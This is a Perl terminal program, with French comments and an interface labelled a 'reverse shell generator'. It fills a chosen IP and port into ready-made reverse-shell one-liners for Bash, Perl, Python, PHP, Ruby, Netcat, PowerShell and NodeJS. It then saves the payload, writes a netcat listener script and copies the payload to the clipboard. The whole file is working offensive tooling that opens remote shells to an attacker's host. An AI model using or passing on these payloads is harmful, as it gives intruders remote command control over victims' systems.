#!/usr/bin/env perl
use strict;
use warnings;
use Curses::UI;
use File::Slurp;

# Couleurs ANSI hacker (vert sur noir)
my $COLOR_GREEN      = 'yellow';
my $COLOR_RED      = 'red';
my $COLOR_GREEN_BOLD = 'blue';

# Fonction copie dans le presse-papier (xclip ou xsel)
sub copy_to_clipboard {
    my ($text) = @_;
    if (`which xclip`) {
        open(my $clip, '|-', 'xclip -selection clipboard') or return;
        print $clip $text;
        close($clip);
    } elsif (`which xsel`) {
        open(my $clip, '|-', 'xsel --clipboard') or return;
        print $clip $text;
        close($clip);
    }
}

# Création interface Curses::UI
my $cui = Curses::UI->new(
    -clear_on_exit => 1,
    -color_support => 1,
);

# Fenêtre principale avec bordure et fond noir
my $win = $cui->add('main', 'Window', -bg => 'grey', -border => 1, -title => 'trhacknon reverse shell generator');

# Quitter avec Ctrl+C
$cui->set_binding(sub { $cui->leave() }, "\cC");

# Titre centré en vert bold
my $title = "trhacknon reverse shell generator";
$win->add(
    'title', 'Label',
    -text => $title,
    -x    => int(($win->width - length($title)) / 2),
    -y    => 0,
    -fg   => $COLOR_GREEN,
    -bg     => 'grey',
    -bold => 1,
);

# Labels et champs avec bordures et couleur verte
sub add_labeled_entry {
    my ($win, $label, $x, $y, $width, $default) = @_;
    $win->add("${label}label", 'Label', -text => "$label :", -x => $x, -y => $y, -fg => $COLOR_GREEN);
    return $win->add("${label}field", 'TextEntry', -x => $x + length($label) + 3, -y => $y, -width => $width, -text => $default, -fg => $COLOR_GREEN, -bg => 'black', -border => 1);
}

my $ipfield   = add_labeled_entry($win, 'Adresse IP', 2, 2, 20, '127.0.0.1');
my $portfield = add_labeled_entry($win, 'Port', 2, 4, 10, '4444');

# Payloads
my %payloads = (
    'Bash'       => sub { "bash -i >& /dev/tcp/%IP%/%PORT% 0>&1" },
    'Perl'       => sub { "perl -e 'use Socket;\$i=\"%IP%\";\$p=%PORT%;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"/bin/sh -i\");};'" },
    'Python'     => sub { "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"%IP%\",%PORT%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'" },
    'PHP'        => sub { "php -r '\$sock=fsockopen(\"%IP%\",%PORT%);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
    'Ruby'       => sub { "ruby -rsocket -e'f=TCPSocket.open(\"%IP%\",%PORT%).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
    'Netcat'     => sub { "nc -e /bin/sh %IP% %PORT%" },
    'Netcat mkfifo' => sub { "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %IP% %PORT% >/tmp/f" },
    'PowerShell (Windows)' => sub { "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('%IP%',%PORT%);[\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}'" },
    'NodeJS'     => sub { "require('child_process').exec('bash -i >& /dev/tcp/%IP%/%PORT% 0>&1');" },
);

my @names = sort keys %payloads;

$win->add('payloadlabel', 'Label', -text => 'Payload :', -x => 2, -y => 6, -fg => $COLOR_GREEN);

my $select = $win->add('payload', 'Popupmenu',
    -values => \@names,
    -x      => 16,
    -y      => 6,
    -width  => 35,
    -fg     => $COLOR_GREEN_BOLD,
    -bg     => 'grey',
    -border => 1,
);

# Bouton Générer avec effet
$win->add('generate', 'Buttonbox',
    -x       => 2,
    -y       => 8,
    -buttons => [
        {
            -label   => '< Générer >',
            -value   => 'generate',
            -onpress => sub {
                my $ip = $ipfield->get;
                my $port = $portfield->get;
                my $choice = $select->get;

                unless ($choice) {
                    $cui->error('Sélectionne un type de payload.');
                    return;
                }

                unless ($ip =~ /^(\d{1,3}\.){3}\d{1,3}$/) {
                    $cui->error("IP invalide !");
                    return;
                }

                unless ($port =~ /^\d+$/ && $port > 0 && $port < 65536) {
                    $cui->error("Port invalide !");
                    return;
                }

                my $template = $payloads{$choice}->();
                my $payload = $template;
                $payload =~ s/%IP%/$ip/g;
                $payload =~ s/%PORT%/$port/g;

                my $listener = "nc -lvnp $port";

                # Sauvegarde fichiers
                write_file('payload.txt', $payload);
                write_file('listener.sh', "#!/bin/bash\n$listener\n");
                chmod 0755, 'listener.sh';

                # Copier dans clipboard
                copy_to_clipboard($payload);

                # Affichage popup
                $cui->dialog(
                    -title   => "Reverse Shell $choice",
                    -message => "Payload copié dans le presse-papier.\n\n$payload\n\nListener à lancer :\n$listener\n\n(payload.txt & listener.sh enregistrés)"
                );
            }
        }
    ],
    -fg => $COLOR_GREEN_BOLD,
    -bg => 'grey',
);

# Bouton Quitter
$win->add('quit', 'Buttonbox',
    -x       => 40,
    -y       => 8,
    -buttons => [
        {
            -label   => '< Quitter >',
            -value   => 'quit',
            -onpress => sub {
                $cui->leave();
            }
        }
    ],
    -fg => $COLOR_GREEN_BOLD,
    -bg => 'black',
);

# Lancement de la boucle UI
$cui->mainloop;
